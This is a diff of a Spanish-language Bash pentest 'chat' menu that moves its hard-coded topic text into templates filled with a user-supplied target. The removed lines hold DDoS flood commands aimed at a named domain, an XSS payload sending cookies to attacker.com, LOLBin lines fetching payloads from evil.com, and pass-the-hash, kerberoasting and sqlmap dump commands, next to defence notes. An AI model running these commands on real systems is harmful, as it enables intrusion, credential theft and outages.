@@ -878,85 +878,70 @@ chat_libre() {
     # ============================================
     # MEJORA 5: Chat con arrays asociativos
     # ============================================
+    
+    # Función para renderizar contenido CHAT_DATA en formato Purple Team
+    _show_chat_topic() {
+        local topic="$1"
+        local title="$2"
+        local pdata="${CHAT_DATA[$topic]}"
+        
+        if [[ -z "$pdata" ]]; then
+            echo -e "${YELLOW}ℹ️  No hay datos estructurados para este tema.${NC}"
+            return 1
+        fi
+        
+        echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
+        echo -e "${PURPLE}║  CHAT EXPERTO — ${CYAN}$title${NC}"
+        echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
+        echo -e "📊 Contexto aplicado contra: ${CYAN}${CHAT_TARGET}${NC}"
+        echo ""
+        
+        # Reemplazar CHAT_TARGET
+        pdata="${pdata//CHAT_TARGET/$CHAT_TARGET}"
+        
+        local temp="$pdata"
+        local delimiter="|||"
+        local secciones=()
+        while [[ "$temp" == *"$delimiter"* ]]; do
+            secciones+=("${temp%%"$delimiter"*}")
+            temp="${temp#*"$delimiter"}"
+        done
+        secciones+=("$temp")
+        
+        for seccion in "${secciones[@]}"; do
+            seccion="$(echo -e "$seccion" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
+            [[ -z "$seccion" ]] && continue
+            
+            if [[ "$seccion" == *"🔴"* ]]; then
+                echo -e "${RED}$seccion${NC}"
+            elif [[ "$seccion" == *"🔵"* ]]; then
+                echo -e "${BLUE}$seccion${NC}"
+            elif [[ "$seccion" == *"🟣"* ]]; then
+                echo -e "${PURPLE}$seccion${NC}"
+            elif [[ "$seccion" == *"📝"* ]]; then
+                echo -e "${YELLOW}$seccion${NC}"
+            else
+                echo -e "$seccion"
+            fi
+            echo ""
+        done
+        return 0
+    }
+
     # Funciones de respuesta para cada tema
     _chat_botnet() {
-        echo "🔐 BOTNETS - TÉCNICAS COMPLETAS"
-        echo ""
-        echo "📚 TEORÍA:"
-        echo "- Red de dispositivos infectados (bots)"
-        echo "- Controlados desde servidor C&C"
-        echo "- Usos: DDoS, spam, minería"
-        echo ""
-        echo "⚔️ TÉCNICAS OFENSIVAS (SOLO EDUCACIÓN):"
-        echo "1. INFECCIÓN:"
-        echo "- Exploit kits en sitios web"
-        echo "- Phishing con malware"
-        echo "- Descargas drive-by"
-        echo ""
-        echo "2. C&C (COMMAND & CONTROL):"
-        echo "- HTTP/HTTPS a dominios"
-        echo "- DNS tunneling"
-        echo "- P2P para resiliencia"
-        echo ""
-        echo "3. ATAQUE DDoS CONTRA ztlab.com.ar:"
-        echo "- SYN Flood: hping3 -S -p 443 --flood www.ztlab.com.ar"
-        echo "- HTTP Flood: bombardier -c 1000 -d 60s https://www.ztlab.com.ar"
-        echo "- Slowloris: python3 slowloris.py www.ztlab.com.ar"
-        echo ""
-        echo "🔧 COMANDOS PRÁCTICOS (LABORATORIO):"
-        echo "- hping3 --syn --flood --rand-source -p 443 [IP_PRUEBA]"
-        echo "- tcpdump -i eth0 'dst port 443' -w trafico.pcap"
-        echo "- tshark -r trafico.pcap -Y 'tcp.flags.syn==1'"
-        echo ""
-        echo "🛡️ DEFENSA:"
-        echo "- Cloudflare WAF"
-        echo "- Rate limiting"
-        echo "- Monitorización"
-        echo ""
-        echo "⚖️ LEGALIDAD:"
-        echo "- SOLO con autorización escrita"
-        echo "- Solo en laboratorios controlados"
-        echo "- Reportar vulnerabilidades"
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "botnet" "Botnets y Command & Control (T1078/T1071)"
     }
 
     _chat_ddos() {
-        echo "🌪️ ATAQUES DDOS - TÉCNICAS"
-        echo ""
-        echo "📊 TIPOS:"
-        echo "- SYN Flood (Layer 4)"
-        echo "- HTTP Flood (Layer 7)"
-        echo "- Slowloris"
-        echo "- Amplificación DNS/NTP"
-        echo ""
-        echo "🔧 COMANDOS:"
-        echo "- hping3 -S -p 80 --flood [OBJETIVO]"
-        echo "- bombardier -c 1000 [URL]"
-        echo "- python3 slowloris.py [OBJETIVO]"
-        echo ""
-        echo "🛡️ PROTECCIÓN:"
-        echo "- CDN (Cloudflare)"
-        echo "- WAF"
-        echo "- Rate limiting"
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "ddos" "Denegación de Servicio (DDoS)"
     }
 
     _chat_sql() {
-        echo "💉 SQL INJECTION - EXPLOTACIÓN"
-        echo ""
-        echo "⚔️ TÉCNICAS:"
-        echo "- ' OR '1'='1"
-        echo "- ' UNION SELECT NULL--"
-        echo "- ' UNION SELECT version(),NULL--"
-        echo ""
-        echo "🔧 SQLMAP COMPLETO:"
-        echo "1. sqlmap -u 'http://sitio.com?id=1'"
-        echo "2. sqlmap -u URL --dbs"
-        echo "3. sqlmap -u URL -D database --tables"
-        echo "4. sqlmap -u URL -D db -T users --dump"
-        echo ""
-        echo "🛡️ PREVENCIÓN:"
-        echo "- Prepared statements"
-        echo "- Input validation"
-        echo "- Least privilege"
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "sql" "Inyección SQL (SQLi)"
     }
 
     _chat_nmap() {
@@ -973,78 +958,31 @@ chat_libre() {
         echo "- Decoys: nmap -D RND:10"
         echo "- Timing: -T0 a -T5"
     }
-
     _chat_xss() {
-        echo "🎯 XSS (CROSS-SITE SCRIPTING)"
-        echo ""
-        echo "💣 PAYLOADS:"
-        echo "- <script>alert(1)</script>"
-        echo "- <img src=x onerror=alert(1)>"
-        echo "- <script>fetch('https://attacker.com/?c='+document.cookie)</script>"
-        echo ""
-        echo "🛠️ HERRAMIENTAS:"
-        echo "- XSSstrike"
-        echo "- Burp Suite"
-        echo "- OWASP ZAP"
-        echo ""
-        echo "🛡️ MITIGACIÓN:"
-        echo "- Content Security Policy"
-        echo "- Output encoding"
-        echo "- HttpOnly cookies"
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "xss" "Cross-Site Scripting XSS (T1059.007)"
     }
 
     _chat_phishing() {
-        echo "🎣 PHISHING - INGENIERÍA SOCIAL"
-        echo ""
-        echo "🔄 TÉCNICAS:"
-        echo "- Clonación de sitios"
-        echo "- Emails suplantando identidad"
-        echo "- SMS phishing (smishing)"
-        echo "- Vishing (phishing por voz)"
-        echo ""
-        echo "🔧 HERRAMIENTAS:"
-        echo "- Social-Engineer Toolkit (SET)"
-        echo "- Gophish"
-        echo "- SimpleEmailSpoofer"
-        echo ""
-        echo "🛡️ PROTECCIÓN:"
-        echo "- Verificar URLs"
-        echo "- Autenticación multifactor"
-        echo "- Educación del usuario"
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "phishing" "Phishing e Ingeniería Social (T1566)"
     }
 
     _chat_hash() {
-        echo "🔐 DESCIFRADO DE HASHES"
-        echo ""
-        echo "📚 TEORÍA:"
-        echo "- Hash = función criptográfica unidireccional"
-        echo "- Se crackea por fuerza bruta o diccionario"
-        echo ""
-        echo "🛠️ HERRAMIENTAS:"
-        echo "- hashcat -m [TIPO] hash.txt wordlist.txt"
-        echo "- john --format=[FORMATO] hash.txt"
-        echo "- hash-identifier (para identificar tipo)"
-        echo ""
-        echo "🎯 EJEMPLOS:"
-        echo "- MD5: hashcat -m 0 hash.txt rockyou.txt"
-        echo "- SHA256: hashcat -m 1400 hash.txt -a 3 ?d?d?d?d"
-        echo "- NTLM: hashcat -m 1000 ntlm_hash.txt wordlist.txt"
-        echo ""
-        echo "⚖️ LEGALIDAD:"
-        echo "- Solo hashes propios o con autorización"
-        echo "- Auditorías de seguridad autorizadas"
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "hash" "Hash Cracking y Credential Dumping (T1003/T1110)"
     }
 
     _chat_default() {
-        echo "ℹ️ No reconozco esa pregunta específica."
+        echo -e "${CYAN}ℹ️ No reconozco esa pregunta específica.${NC}"
         echo ""
-        echo "🎯 Prueba con:"
-        echo "- 'botnet sobre ztlab.com.ar'"
-        echo "- 'como hacer ddos'"
-        echo "- 'sql injection técnicas'"
-        echo "- 'nmap comandos'"
-        echo "- 'xss payloads'"
-        echo "- 'hash cracking'"
+        echo -e "${GREEN}🎯 Prueba con temas como:${NC}"
+        echo -e "  ${YELLOW}•${NC} 'ddos a 10.0.0.1'        ${YELLOW}•${NC} 'sql injection sobre sitio.com'"
+        echo -e "  ${YELLOW}•${NC} 'phishing'              ${YELLOW}•${NC} 'kerberoasting'"
+        echo -e "  ${YELLOW}•${NC} 'lolbins'               ${YELLOW}•${NC} 'pass the hash'"
+        echo -e "  ${YELLOW}•${NC} 'xss'                   ${YELLOW}•${NC} 'botnet'"
+        echo -e "  ${YELLOW}•${NC} 'cve'                   ${YELLOW}•${NC} 'apt29 / apt38 / fin7'"
+        echo -e "  ${YELLOW}•${NC} 'sabias que'            ${YELLOW}•${NC} 't1003 / t1566 / t1059'"
     }
 
     # Array asociativo: palabra_clave → función_de_respuesta
@@ -1085,151 +1023,38 @@ chat_libre() {
 
     # Funciones de respuesta para nuevos temas
     _chat_cve() {
-        echo "🔍 TOP CVEs CRÍTICOS 2024-2025"
-        echo ""
-        for cve_id in "${!CVE_DATA[@]}"; do
-            echo -e "  ${YELLOW}$cve_id${NC}: ${CVE_DATA[$cve_id]}"
-        done
-        echo ""
-        echo "📌 Referencia: https://nvd.nist.gov/vuln/search"
-        echo "📌 Exploits:   https://www.exploit-db.com"
+        _show_chat_topic "cve" "Top CVEs 2024-2025"
     }
 
     _chat_kerberoasting() {
-        echo "🎫 KERBEROASTING — T1558.003"
-        echo ""
-        echo "📚 CONCEPTO:"
-        echo "  Cualquier usuario autenticado en AD puede solicitar tickets TGS"
-        echo "  para cuentas de servicio con SPN. El TGS está cifrado con la"
-        echo "  contraseña de la cuenta de servicio → crackebale offline."
-        echo ""
-        echo "🔴 ATAQUE:"
-        echo "  # Enum SPNs y solicitar tickets"
-        echo "  GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request"
-        echo "  Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt"
-        echo ""
-        echo "  # Crackear con hashcat (-m 13100 = krb5tgs)"
-        echo "  hashcat -m 13100 -a 0 hashes.txt rockyou.txt"
-        echo ""
-        echo "🔵 DEFENSA:"
-        echo "  • Usar AES-256 (Etype 18) en lugar de RC4 (Etype 17)"
-        echo "  • Managed Service Accounts (gMSA): contraseñas automáticas"
-        echo "  • Contraseñas >25 caracteres en cuentas de servicio"
-        echo ""
-        echo "🟣 DETECCIÓN:"
-        echo "  • Event 4769: muchos TGS Etype 0x17 en poco tiempo"
-        echo "  • MITRE: https://attack.mitre.org/techniques/T1558/003/"
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "kerberoasting" "Kerberoasting (T1558.003)"
     }
 
     _chat_lolbins() {
-        echo "🏠 LOLBINS — Living Off The Land Binaries (T1218)"
-        echo ""
-        echo "📚 CONCEPTO: usar herramientas legítimas del OS para atacar"
-        echo "  → El AV/EDR no detecta binarios firmados por Microsoft"
-        echo ""
-        echo "🔴 LOLBINS POPULARES:"
-        echo "  certutil   → descargar: certutil -urlcache -f http://evil.com/x.exe x.exe"
-        echo "  mshta      → HTA remoto: mshta http://evil.com/payload.hta"
-        echo "  regsvr32   → sct remoto: regsvr32 /s /u /i:http://evil.com/x.sct scrobj.dll"
-        echo "  msiexec    → MSI remoto: msiexec /q /i http://evil.com/x.msi"
-        echo "  wscript    → VBS/JS:     wscript payload.vbs"
-        echo "  rundll32   → DLL:        rundll32 evil.dll,EntryPoint"
-        echo "  odbcconf    → regsvr emulado"
-        echo "  bitsadmin  → descarga en background"
-        echo ""
-        echo "🔵 DEFENSA: WDAC / AppLocker → whitelist de execution"
-        echo "🟣 DETECCIÓN: Sysmon ID 1, correlacionar args de red en binarios 'legítimos'"
-        echo ""
-        echo "📌 LOLBAS Project: https://lolbas-project.github.io"
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "lolbins" "Living Off The Land Binaries (T1218)"
     }
 
     _chat_pth() {
-        echo "🔑 PASS THE HASH — T1550.002"
-        echo ""
-        echo "📚 CONCEPTO:"
-        echo "  NTLM no necesita la contraseña en texto claro, sólo el hash NTLM."
-        echo "  Si obtienes el hash, puedes autenticarte directamente."
-        echo ""
-        echo "🔴 ATAQUE:"
-        echo "  # Con impacket"
-        echo "  psexec.py DOMAIN/user@TARGET -hashes :NTLM_HASH"
-        echo "  wmiexec.py DOMAIN/user@TARGET -hashes :NTLM_HASH"
-        echo "  smbexec.py DOMAIN/user@TARGET -hashes :NTLM_HASH"
-        echo ""
-        echo "  # Con crackmapexec (spraying)"
-        echo "  crackmapexec smb 192.168.1.0/24 -u admin -H NTLM_HASH"
-        echo ""
-        echo "  # Con mimikatz (Windows)"
-        echo "  sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe"
-        echo ""
-        echo "🔵 DEFENSA:"
-        echo "  • Credential Guard (elimina hashes de memoria LSASS)"
-        echo "  • Kerberos en lugar de NTLM donde sea posible"
-        echo "  • Disable NTLMv1: solo permitir NTLMv2"
-        echo ""
-        echo "🟣 DETECCIÓN:"
-        echo "  • Event 4624 Logon Type 3 con misma cuenta desde IPs distintas"
-        echo "  • NTLM auth masiva → posible spraying de hashes"
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "pth" "Pass-the-Hash (T1550.002)"
     }
 
     _chat_apt29() {
-        echo "🕵️ COZY BEAR — APT29 (SVR Rusia)"
-        echo ""
-        echo "  Motivación:  Espionaje gubernamental y geopolítico"
-        echo "  Objetivos:   Gobierno, think tanks, salud, tecnología"
-        echo "  Campañas:    SolarWinds (2020), COVID vaccines (2021), NGO targeting"
-        echo ""
-        echo "📋 TÉCNICAS CLAVE MITRE:"
-        IFS='|' read -ra ts <<< "${APT_TECNICAS[APT29]}"
-        for t in "${ts[@]}"; do
-            printf "  ${YELLOW}%-16s${NC}%s\n" "${t%%:*}" "${t##*:}"
-        done
-        echo ""
-        echo "  Herramientas únicas: SUNBURST, SUNSPOT, WellMess, BEACON"
-        echo "  Referencia: https://attack.mitre.org/groups/G0016/"
+        _show_chat_topic "apt29" "APT29 / Cozy Bear (SVR Rusia)"
     }
 
     _chat_apt38() {
-        echo "🕵️ LAZARUS GROUP — APT38 (RGB Corea del Norte)"
-        echo ""
-        echo "  Motivación:  Financiera + sabotaje"
-        echo "  Objetivos:   Bancos SWIFT, exchanges cripto, defensa"
-        echo "  Campañas:    Bangladesh Bank \$81M (2016), Sony Pictures, WannaCry"
-        echo ""
-        echo "📋 TÉCNICAS CLAVE MITRE:"
-        IFS='|' read -ra ts <<< "${APT_TECNICAS[APT38]}"
-        for t in "${ts[@]}"; do
-            printf "  ${YELLOW}%-16s${NC}%s\n" "${t%%:*}" "${t##*:}"
-        done
-        echo ""
-        echo "  Herramientas: BLIND CANARY, HOPLIGHT, DESTOVER wiper"
-        echo "  Referencia: https://attack.mitre.org/groups/G0082/"
+        _show_chat_topic "apt38" "APT38 / Lazarus Group (RPDC)"
     }
 
     _chat_fin7() {
-        echo "🕵️ FIN7 — CARBANAK GROUP"
-        echo ""
-        echo "  Motivación:  Financiera — robo de tarjetas, fraude, ransomware"
-        echo "  Objetivos:   Retail, hospitalidad, restaurantes, finanzas"
-        echo "  Campañas:    Carbanak bancario \$1B+, ALPHV ransomware"
-        echo ""
-        echo "📋 TÉCNICAS CLAVE MITRE:"
-        IFS='|' read -ra ts <<< "${APT_TECNICAS[FIN7]}"
-        for t in "${ts[@]}"; do
-            printf "  ${YELLOW}%-16s${NC}%s\n" "${t%%:*}" "${t##*:}"
-        done
-        echo ""
-        echo "  Herramientas: BABYMETAL, BIRDWATCH, CARBANAK, DICELOADER"
-        echo "  Referencia: https://attack.mitre.org/groups/G0046/"
+        _show_chat_topic "fin7" "FIN7 / Carbanak (Crimen Organizado)"
     }
 
     _chat_trivia() {
-        local idx=$(( RANDOM % ${#SABIAS_QUE[@]} ))
-        echo "💡 ¿SABÍAS QUE...?"
-        echo ""
-        echo "  ${SABIAS_QUE[$idx]}"
-        echo ""
-        echo "  Escribe 'cve', 'kerberoasting', 'lolbins', 'apt29'... para más!"
+        _show_chat_topic "trivia" "¿Sabías que? — Threat Intelligence 2024-2025"
     }
 
     _chat_mitre_t1003() {
@@ -1269,6 +1094,26 @@ chat_libre() {
         read -p "❓ Tu pregunta: " pregunta
 
         pregunta_lower=$(echo "$pregunta" | tr '[:upper:]' '[:lower:]')
+
+        # Extraer dominio/IP de la pregunta
+        local extracted_domain=""
+        if [[ "$pregunta_lower" =~ ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|[a-z0-9.-]+\.[a-z]{2,}) ]]; then
+            extracted_domain="${BASH_REMATCH[1]}"
+        fi
+        
+        # Determinar CHAT_TARGET
+        unset CHAT_TARGET
+        if [[ -n "$extracted_domain" ]]; then
+            export CHAT_TARGET="$extracted_domain"
+            echo -e "  ${GREEN}✅ Objetivo temporal detectado para el chat: ${CYAN}$CHAT_TARGET${NC}"
+            sleep 1
+        elif [[ -n "$TARGET" ]]; then
+            export CHAT_TARGET="$TARGET"
+        else
+            echo ""
+            read -p "🎯 (Opcional) No se detectó objetivo. Ingresa IP/Dominio para contexto: " CHAT_TARGET
+            [[ -z "$CHAT_TARGET" ]] && export CHAT_TARGET="[OBJETIVO]"
+        fi
 
         if [[ "$pregunta_lower" == "salir" ]]; then
             echo ""
